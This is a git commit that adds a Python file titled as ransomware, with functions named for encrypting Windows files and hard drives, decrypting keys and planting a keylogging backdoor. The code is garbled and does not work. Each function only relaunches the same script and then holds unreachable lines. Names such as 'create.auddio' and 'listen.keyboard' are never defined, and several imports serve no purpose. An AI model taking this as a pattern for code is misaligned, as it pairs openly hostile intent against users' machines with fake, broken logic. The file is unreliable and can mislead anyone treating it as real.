c6955f6f3183229583c788a8764d84bf98f501bb
R00tkitSecurity <110135107+R00tkitSecurity@users.noreply.github.com>
2022-09-15 16:54:27 -0300

    Add files via upload

---
+++ Ramsonware/ramsonware.py
@@ -0,0 +1,81 @@
+## Malware Title: lockyramsonware
+## Date: 15-09-22
+## Author: @retr0haxor
+## Version: 0.1
+
+from asyncio import subprocess
+from asyncio.log import logger
+import base64
+from email.utils import decode_rfc2231, encode_rfc2231
+from lib2to3.pgen2.tokenize import generate_tokens
+import logging
+from logging.config import fileConfig, listen
+from pyexpat import version_info
+from telnetlib import ENCRYPT
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
+import argparse
+import os
+
+import discover
+import modify
+
+## Make a Ramsomware
+def make_ransomware():
+    make_ransomware = subprocess.Popen(['python3', 'ramsonware.py'], stdout=subprocess.PIPE)
+    make_ransomware.wait()
+    return make_ransomware
+    make_ransomware = (base64.b64encode(make_ransomware))
+    return make_ransomware
+
+    ## Encrypt the files For Windows Ramsonware
+def encrypt_file_windows():
+    encrypt_file_windows = subprocess.Popen(['python3', 'ramsonware.py'], stdout=subprocess.PIPE)
+    encrypt_file_windows.wait()
+    return encrypt_file_windows
+    encrypt_file_windows = (base64.b64encode(encrypt_file_windows))
+    return encrypt_file_windows
+    encrypt_file_windows = (base64.b64decode(encrypt_file_windows))
+
+    ## Create Function hard drive Encrypt
+def encrypt_hard_drive():
+    encrypt_hard_drive = subprocess.Popen(['python3', 'ramsonware.py'], stdout=subprocess.PIPE)
+    encrypt_hard_drive.wait()
+    return encrypt_hard_drive
+    encrypt_hard_drive = (base64.b64encode(encrypt_hard_drive))
+    return encrypt_hard_drive
+    encrypt_hard_drive = (base64.b64decode(encrypt_hard_drive))
+
+encrypt_hard_drive = (base64, logging, encrypt_file_windows, make_ransomware)
+encrypt_hard_drive = (base64.encode(encrypt_hard_drive)) (decrypt.key, decrypt.iv)
+def decrypt_key():
+    decrypt_key = subprocess.Popen(['python3', 'ramsonware.py'], stdout=subprocess.PIPE)
+    decrypt_key.wait()
+    return decrypt_key
+    decrypt_key = (base64.b64encode(decrypt_key))
+    return decrypt_key
+    decrypt_key = (base64.b64decode(decrypt_key))
+    decrypt_key = (key.generate_key())
+    decrypt_key = (fileConfig, generate.token, "Windows", version_info, "7", "8.1", "10")
+
+    ## Create a Backdoor for Windows
+def backdoor_windows():
+    backdoor_windows = (subprocess.run, subprocess.PIPE, subprocess.wait)
+    backdoor_windows = (subprocess.Popen(['python3', 'ramsonware.py'], stdout=subprocess.PIPE))
+    backdoor_windows = (create.auddio, create.video, create.image, create.document, create.executable, create.archive, create.disk_image, create.database, create.font, create.presentation, create.spreadsheet, create.system, create.web, create.plugin, create.unknown)
+    backdoor_windows = (listen.auddio, listen.video, listen.image, listen.document, listen.executable, listen.archive, listen.disk_image, listen.database, listen.font, listen.presentation, listen.spreadsheet, listen.system, listen.web, listen.plugin, listen.unknown)
+    backdoor_windows = (listen.keyboard, keyboard.logger, listen)
+    backdoor_windows = (listen.mouse, mouse.logger, listen)
+    backdoor_windows = (listen.screen, screen.logger, listen)
+    backdoor_windows = (listen.file, file.logger, listen)
+    backdoor_windows = (listen.network, network.logger, listen)
+    backdoor_windows = (encrypt_file_windows, encrypt_hard_drive, decrypt_key, backdoor_windows)
+    backdoor_windows = (base64.b64encode(backdoor_windows))
+    return backdoor_windows
+    backdoor_windows = (base64.b64decode(backdoor_windows))
+    backdoor_windows = (encrypt_hard_drive)
+    f = open("backdoor_windows", "w")
+    f = (generate_tokens, "Windows", version_info, "7", "8.1", "10")
+    f = (decrypt_key, decode_rfc2231)
+
+
